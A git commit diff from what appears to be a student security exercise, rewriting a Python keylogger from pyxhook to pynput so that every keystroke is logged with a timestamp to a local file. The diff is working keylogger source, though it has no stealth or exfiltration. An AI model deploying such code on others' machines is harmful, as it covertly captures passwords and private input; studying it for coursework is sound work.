2da2ded25b463db26f8ce5bf49cc3f1d8a763885
Madhumitha K <90406259+MadhumithaK05@users.noreply.github.com>
2024-05-23 16:31:07 +0530

    Update Keylogger.py

--- Ex-08/Keylogger.py
+++ Ex-08/Keylogger.py
@@ -1,42 +1,17 @@
-import os
-import pyxhook
+from pynput import keyboard
+import logging
 
-# This tells the keylogger where the log file will go.
-# You can set the file path as an environment variable ('pylogger_file'),
-# or use the default ~/Desktop/file.log
-log_file = os.environ.get('pylogger_file', os.path.expanduser('/Users/madhumithak/Documents/CNS'))
+# Set up logging to capture keystrokes
+logging.basicConfig(filename="keylog.txt", level=logging.DEBUG, format="%(asctime)s: %(message)s")
 
-# Allow setting the cancel key from environment args, Default: `
-cancel_key = ord(os.environ.get('pylogger_cancel', '`')[0])
-
-# Allow clearing the log file on start, if pylogger_clean is defined.
-if os.environ.get('pylogger_clean', None) is not None:
+def on_press(key):
     try:
-        os.remove(log_file)
-    except EnvironmentError:
-        # File does not exist, or no permissions.
-        pass
+        # Log the key press
+        logging.info(str(key.char))
+    except AttributeError:
+        # Handle special keys
+        logging.info(str(key))
 
-# Creating key pressing event and saving it into log file
-def OnKeyPress(event):
-    with open(log_file, 'a') as f:
-        f.write('{}\n'.format(event.Key))
-
-# Create a hook manager object
-new_hook = pyxhook.HookManager()
-new_hook.KeyDown = OnKeyPress
-
-# Set the hook
-new_hook.HookKeyboard()
-
-try:
-    new_hook.start()  # Start the hook
-except KeyboardInterrupt:
-    # User cancelled from command line.
-    pass
-except Exception as ex:
-    # Write exceptions to the log file, for analysis later.
-    msg = 'Error while catching events:\n {}'.format(ex)
-    pyxhook.print_err(msg)
-    with open(log_file, 'a') as f:
-        f.write('\n{}'.format(msg))
+# Start listening to keystrokes
+with keyboard.Listener(on_press=on_press) as listener:
+    listener.join()
